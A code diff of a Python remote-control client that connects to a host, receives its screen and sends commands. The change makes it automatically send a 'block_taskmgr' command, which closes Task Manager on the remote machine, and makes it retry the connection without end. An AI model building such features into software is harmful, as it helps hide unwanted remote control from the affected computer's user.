@@ -159,7 +159,7 @@ class CommandSender(threading.Thread):
         print("block_taskmgr - автозакрытие диспетчера задач")
         print("exit - отключиться")
         print("\nYou can send multiple commands at once by separating them with semicolons (;).")
-        
+        self.sock.sendall("block_taskmgr".encode())
         try:
             while self.is_running() and self.screen_receiver.is_running():
                 try:
@@ -269,10 +269,9 @@ def main():
     if mode == "2":
         multicast_recv()
     elif mode == "1":
+        HOST = get_valid_ip()
         while True:
             try:
-                HOST = get_valid_ip()
-                
                 print(f"Attempting to connect to {HOST}:{PORT}...")
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     s.settimeout(5)
@@ -302,9 +301,9 @@ def main():
                 print(f"Fatal error: {e}")
                 break
                 
-            retry = input("Would you like to try again? (y/n): ").lower()
-            if retry != 'y':
-                break
+            #retry = input("Would you like to try again? (y/n): ").lower()
+            #if retry != 'y':
+            #    break
 
         cv2.destroyAllWindows()
 
